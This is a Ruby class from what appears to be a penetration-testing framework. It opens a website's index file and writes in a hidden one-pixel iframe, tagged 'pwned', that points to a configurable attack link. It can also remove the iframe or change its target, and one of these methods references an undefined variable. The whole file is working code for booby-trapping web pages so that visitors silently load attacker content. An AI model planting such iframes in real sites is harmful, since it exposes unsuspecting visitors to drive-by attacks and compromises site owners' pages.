module FIDIUS::Session
  class BoobyTrapHandler
    def initialize pathToIndex = ""
      @path = pathToIndex
      @boobyTrapped = nil
      @iframeLineNumber = 0
      if File.exists? pathToIndex
        @indexFileArray = File.readlines pathToIndex
      else
        raise NameError, "Could not find File: '#{pathToIndex}'! BoobyTrapHandler not initialized"
      end
    end
    
    def showFile
      line = "-"
      49.times do line += "-" end
      puts line
      puts @indexFileArray
      puts line
    end
    
    def addIframe pwnLink = "http://www.google.de"
      unless boobyTrapped? then
        iframe =  "<div style='visibility:hidden'>"
        iframe += " <iframe src='#{pwnLink}' width='1' height='1' scrolling='no' frameborder='0' id='pwned'></iframe>"
        iframe += "</div>\n"
      
        @indexFileArray.each_with_index do |line,i|
           if line.include? "</body>" then
             @indexFileArray.insert i, iframe
             @iframeLineNumber = i
             @boobyTrapped = true
             break
           end
        end
        unless @boobyTrapped then
          @indexFileArray << iframe 
          @iframeLineNumber = (@indexFileArray.size - 1)
          @boobyTrapped = true
        end
        updateFile
     end
    end
    
    def removeIframe
      if boobyTrapped? then
        puts @iframeLineNumber
        if @indexFileArray[@iframeLineNumber].include? "</iframe>" and @indexFileArray[@iframeLineNumber].include? "id='pwned'" then
            @indexFileArray.delete_at @iframeLineNumber
        end
        updateFile
         @boobyTrapped = false
       end
    end
    
    def updateIframeSrc pwmLink
      if @boobyTrapped then
         if @indexFileArray[@iframeLineNumber].include? "</iframe>" and line.include? "id='pwned'" then
           @indexFileArray[@iframeLineNumber] = @indexFileArray[@iframeLineNumber].gsub /src='[^\s]+/, "src='#{pwmLink}'" 
         end
         updateFile
       end
    end
    
    def boobyTrapped?
      if @boobyTrapped == nil then
        @indexFileArray.each_with_index do |line,i|
          if line.include? "id='pwned'" then
            @boobyTrapped = true
            @iframeLineNumber = i
            break
          end
          @boobyTrapped = false
        end
      end
      @boobyTrapped
    end
    
    private
    
    def updateFile
      File.open(@path, "w") do |f| 
         @indexFileArray.each{|line| f.puts(line)}
       end
    end
  end
end

